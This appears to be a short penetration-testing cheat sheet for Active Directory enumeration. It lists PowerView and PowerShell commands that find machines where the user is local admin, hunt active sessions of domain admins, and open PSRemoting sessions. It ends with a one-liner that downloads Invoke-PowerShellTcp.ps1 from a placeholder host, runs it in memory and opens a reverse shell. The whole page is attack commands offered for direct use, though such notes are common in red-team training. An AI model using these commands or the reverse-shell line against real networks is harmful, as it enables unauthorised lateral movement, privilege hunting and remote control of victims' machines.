# 9⃣ Miscellaneous Enumeration

### **Powerview Find all machines on the current domain where the current user has local admin access**

```
Find-LocalAdminAccess -Verbose
```

```
. ./Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```

```
. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

### **Powerview Find local admins on all machines of the domain (needs admin privs)**

```
Invoke-EnumerateLocalAdmin -Verbose
```

### **Connect to machine with administrator privs**

```
Enter-PSSession -Computername <computername>
```

### **Save and use sessions of a machine**

```
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

### **Find active sessions**

```
Invoke-UserHunter
Invoke-UserHunter -Groupname "RDPUsers"
```

### **Find active sessions of domain admins**

```
Invoke-UserHunter -Groupname "Domain Admins"
```

### **Check access to machine**

```
Invoke-UserHunter -CheckAccess
```

### **Powershell reverse shell**

{% code overflow="wrap" %}
```
Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IP
```
{% endcode %}
